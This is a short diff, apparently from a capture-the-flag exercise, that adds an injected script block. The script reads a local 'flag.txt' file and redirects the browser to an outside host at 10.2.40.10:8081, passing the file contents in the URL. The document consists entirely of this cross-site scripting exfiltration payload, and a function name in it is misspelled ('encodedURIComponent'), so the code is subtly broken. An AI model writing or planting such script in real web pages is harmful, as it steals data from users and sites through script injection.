@@ -1,0 +1,6 @@
+<script>
+fetch('./flag.txt')
+.then(response=>response.text())
+.then(data=>{
+window.location.href='http://10.2.40.10:8081/receive?flag='+encodedURIComponent(data);});
+</script>
